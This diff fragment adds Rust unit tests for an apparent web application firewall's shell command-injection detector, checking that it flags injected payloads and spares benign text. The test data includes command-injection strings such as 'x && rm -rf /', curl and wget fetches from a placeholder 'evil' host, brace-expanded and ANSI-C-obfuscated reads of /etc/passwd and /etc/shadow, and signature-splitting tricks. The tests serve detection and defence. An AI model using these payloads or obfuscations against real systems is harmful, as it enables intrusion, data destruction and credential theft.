+            "/etc/{hosts,resolv.conf}",
+            "{\"user\":\"passwd\",\"dir\":\"/etc/\"}",
+            "report-{2024,2025}.csv",
+            "/etc/{passwd",
+            "/etc/{passwd}",
+            "the password field is named passwd in /etc/ style configs",
+        ] {
+            assert!(trav_fire(benign).is_none(), "benign brace payload fired: {benign}");
         }
     }
 
@@ -5196,6 +5858,226 @@ mod tests {
         ];
         for c in clean {
             assert!(rce_ast_fire(c).is_none(), "clean AST negative fired: {c:?}");
+        }
+    }
+
+    // ── Detection-gap batch: bare separators / brace / ANSI-C / `${!x}` / `[[ ]]` ──
+
+    #[test]
+    fn rce_ast_cmd_chain_injection_fires_on_bare_separators() {
+        // The gap `rce.cmd_sep_common` (default-off) and `walk_pipeline`
+        // (recursed without scoring) both left open: injected value → bare
+        // separator → executor WITH an argument.
+        for payload in [
+            "1|echo pwned",
+            "1 | echo pwned",
+            "x && rm -rf /",
+            "x.jpg;curl http://evil/x",
+            "42 || wget http://evil/s.sh",
+            "abc; id -u",
+            "v1.0&&chmod 777 /tmp/x",
+        ] {
+            let f = rce_ast_fire(payload).unwrap_or_else(|| panic!("chain injection must fire: {payload:?}"));
+            assert_eq!(f.attack, AttackKind::Rce);
+            assert_eq!(f.rule_key, "rce_ast.cmd_chain_injection", "payload {payload:?}");
+            // 0.5 · 80 = 40 = log_threshold, and 40 < block_threshold(80): the rule
+            // is Log-capable alone but can never Block without corroboration.
+            assert_eq!(f.confidence.get(), 80, "payload {payload:?}");
+        }
+    }
+
+    #[test]
+    fn rce_ast_cmd_chain_injection_benign_negatives() {
+        // Every one of these is traffic the widening incidents produced: prose with
+        // `&&`, markdown tables with `|`, pasted shell transcripts and tutorials,
+        // cookie / header syntax, CSS, JSON, and `rm` used as an English token.
+        let benign = [
+            // Prose / query strings with `&&`.
+            "tom && jerry",
+            "A && B",
+            "revenue grew && margins held",
+            "if (isReady && hasData) return true;",
+            // Markdown / table pipes with title-cased cells.
+            "Alexa | Echo Dot",
+            "Dog | Cat food",
+            "Status | Type check",
+            "Name | Description | Default",
+            "name | id | email",
+            "value=a|b|c",
+            // Pasted shell transcripts and tutorials: they LEAD with a real command.
+            "cat access.log | grep 404",
+            "ps aux | grep nginx",
+            "ls -la | head -5",
+            "cd /tmp && rm -rf build",
+            "npm run build && npm test",
+            "make && make install",
+            "git log --oneline | head",
+            "curl -s https://api.example.com/v1 | jq .",
+            "echo hello | tr a-z A-Z",
+            "docker ps -a | awk '{print $1}'",
+            // Quote-aware: a separator INSIDE quotes is not a chain.
+            "echo \"a; rm -rf /\"",
+            "echo 'x && id -u'",
+            // `rm` as ordinary content.
+            "action=confirm-rm-dialog",
+            "rm is a Unix command that removes files",
+            "please rm the old backups when you get a chance",
+            // Separators with no command after them.
+            "sessionid=abc; path=/; secure",
+            "text/html;q=0.9",
+            "color:red; background:blue",
+            "a;b;c",
+            "1|2|3",
+        ];
+        for b in benign {
+            assert!(
+                rce_ast_fire(b).is_none(),
+                "benign payload must not fire the AST detector: {b:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn rce_ast_brace_expanded_sensitive_read_fires() {
+        // `cat /etc/{passwd,shadow}` really opens /etc/passwd on the backend, but
+        // neither literal path appears in the request. The bounded expander in
+        // `arg_hits_sensitive_path` closes the "parser is not an expander" gap.
+        for payload in [
+            "cat /etc/{passwd,shadow}",
+            "head /etc/{hosts,passwd}",
+            "xxd /etc/{group,passwd}",
+            "strings /etc/{a,b,shadow}",
+        ] {
+            let f = rce_ast_fire(payload).unwrap_or_else(|| panic!("brace sensitive read must fire: {payload:?}"));
+            assert_eq!(f.rule_key, "rce_ast.sensitive_read", "payload {payload:?}");
+        }
+        // Benign brace expansions with no sensitive member stay clean.
+        for benign in [
+            "cat /etc/{hosts,resolv.conf}",
+            "cp report-{2024,2025}.csv /backup/",
+            "{\"a\":1,\"b\":2}",
+            "cat /var/log/{app,web}.log",
+        ] {
+            assert!(rce_ast_fire(benign).is_none(), "benign brace fired: {benign:?}");
+        }
+    }
+
+    #[test]
+    fn rce_ast_ansi_c_quoted_command_is_decoded() {
+        // `$'\x63\x61\x74'` IS `cat` to bash; the parser leaves it verbatim.
+        let f = rce_ast_fire(r"$'\x63\x61\x74' /etc/passwd").expect("ANSI-C quoted reader must fire");
+        assert_eq!(f.rule_key, "rce_ast.sensitive_read");
+        // Octal form.
+        let o = rce_ast_fire(r"$'\143\141\164' /etc/passwd").expect("octal ANSI-C reader must fire");
+        assert_eq!(o.rule_key, "rce_ast.sensitive_read");
+        // And the argument side: a fully ANSI-C-quoted sensitive path.
+        let a = rce_ast_fire(r"cat $'/etc/\x70asswd'").expect("ANSI-C quoted path must fire");
+        assert_eq!(a.rule_key, "rce_ast.sensitive_read");
+    }
+
+    #[test]
+    fn rce_ast_indirect_expansion_is_seen_through_and_reported() {
+        // `${!x}` on its own executes nothing — it is a signature splitter. It is
+        // reported at confidence 60 (0.5 · 60 = 30 < log_threshold 40 → shadow
+        // telemetry only, never a standalone verdict).
+        let f = rce_ast_fire("${!x}").expect("indirect expansion must be reported");
+        assert_eq!(f.rule_key, "rce_ast.param_indirect");
+        assert_eq!(f.confidence.get(), 60);
+        // Used as an obfuscator it must no longer split the keyword: the word-level
+        // de-obfuscation re-joins `c${!x}at` into `cat`, so the real rule fires.
+        let j = rce_ast_fire("c${!x}at /etc/passwd").expect("split reader must resolve");
+        assert_eq!(j.rule_key, "rce_ast.sensitive_read");
+        let p = rce_ast_fire("cat /et${!q}c/passwd").expect("split path must resolve");
+        assert_eq!(p.rule_key, "rce_ast.sensitive_read");
+    }
+
+    #[test]
+    fn rce_ast_extended_test_is_no_longer_discarded() {
+        // `Command::ExtendedTest` used to be an explicit empty arm.
+        let f = rce_ast_fire("[[ -f /etc/passwd ]]").expect("extended test on a sensitive path must fire");
+        assert_eq!(f.rule_key, "rce_ast.cond_sensitive_path");
+        assert_eq!(f.confidence.get(), 70);
+        // A command substitution smuggled into a comparison is walked too.
+        let s = rce_ast_fire("[[ x == $(id) ]]").expect("subst inside extended test must fire");
+        assert_eq!(s.rule_key, "rce_ast.cmd_subst");
+        // Benign conditionals stay clean.
+        for benign in ["[[ -f /var/log/app.log ]]", "[[ $a == $b ]]", "[[ -z ${name} ]]"] {
+            assert!(rce_ast_fire(benign).is_none(), "benign extended test fired: {benign:?}");
+        }
+    }
+
+    #[test]
+    fn deobfuscate_word_decodes_ansi_c_and_drops_indirect_expansion() {
+        assert_eq!(deobfuscate_word(r"$'\x63\x61\x74'").as_ref(), "cat");
+        assert_eq!(deobfuscate_word(r"$'\143\141\164'").as_ref(), "cat");
+        assert_eq!(deobfuscate_word(r"$'a\tb\n'").as_ref(), "a\tb\n");
+        assert_eq!(deobfuscate_word(r"$'cat'").as_ref(), "cat");
+        assert_eq!(deobfuscate_word("c${!x}at").as_ref(), "cat");
+        assert_eq!(deobfuscate_word("${!a}${!b}id").as_ref(), "id");
+        // Untouched: no marker, `$IFS` (a SPACE, owned by shell_normalize), `${x}`.
+        assert_eq!(deobfuscate_word("/etc/passwd").as_ref(), "/etc/passwd");
+        assert_eq!(
+            deobfuscate_word("cat${IFS}/etc/passwd").as_ref(),
+            "cat${IFS}/etc/passwd"
+        );
+        assert_eq!(deobfuscate_word("${x}").as_ref(), "${x}");
+        // Unterminated forms degrade gracefully (no panic, no truncation to empty).
+        assert_eq!(deobfuscate_word("${!x").as_ref(), "${!x");
+        assert_eq!(deobfuscate_word(r"$'\x6").as_ref(), "\u{6}");
+    }
+
+    #[test]
+    fn expand_braces_is_bounded_and_leaves_parameter_expansion_alone() {
+        let mut out = Vec::new();
+        expand_braces_into("/etc/{passwd,shadow}", 0, &mut out);
+        assert_eq!(out, vec!["/etc/passwd".to_string(), "/etc/shadow".to_string()]);
+        // `${…}` is a parameter expansion, not a brace expansion.
+        out.clear();
+        expand_braces_into("${a,b}", 0, &mut out);
+        assert_eq!(out, vec!["${a,b}".to_string()]);
+        // No comma → not an alternation.
+        out.clear();
+        expand_braces_into("/etc/{passwd}", 0, &mut out);
+        assert_eq!(out, vec!["/etc/{passwd}".to_string()]);
+        // A comma-less group does not abort the scan: the next real alternation is
+        // still expanded (otherwise `{x}{passwd,shadow}` would be a free bypass).
+        out.clear();
+        expand_braces_into("/etc/{x}{passwd,shadow}", 0, &mut out);
+        assert_eq!(out, vec!["/etc/{x}passwd".to_string(), "/etc/{x}shadow".to_string()]);
+        // Combinatorial payloads are hard-capped, never exponential.
+        out.clear();
+        let bomb = "{a,b}".repeat(20);
+        expand_braces_into(&bomb, 0, &mut out);
+        assert!(
+            out.len() <= BRACE_MAX_RESULTS,
+            "expansion must stay capped: {}",
+            out.len()
+        );
+        // Oversized input is passed through untouched.
+        out.clear();
+        let big = format!("/etc/{{{},passwd}}", "a".repeat(BRACE_MAX_INPUT_BYTES));
+        expand_braces_into(&big, 0, &mut out);
+        assert_eq!(out, vec![big]);
+    }
+
+    #[test]
+    fn shell_ast_prefilter_admits_new_markers_without_admitting_prose() {
+        // New markers.
+        assert!(shell_ast_prefilter("${!x}"), "indirect expansion admitted");
+        assert!(shell_ast_prefilter("x && rm -rf /"), "&& + executor admitted");
+        assert!(shell_ast_prefilter("abc;id -u"), "; + executor admitted");
+        // NOT admitted: a bare `;` / `&&` with no executor behind it — the cookie /
+        // header / CSS / prose shapes that would otherwise burn the AST budget.
+        for spared in [
+            "sessionid=abc; path=/; secure",
+            "text/html;q=0.9",
+            "color:red; background:blue",
+            "tom && jerry",
+            "if (a && b) return;",
+            "Foo && Bar",
+            "${name} template",
+        ] {
+            assert!(!shell_ast_prefilter(spared), "prefilter must spare: {spared:?}");
         }
     }
 
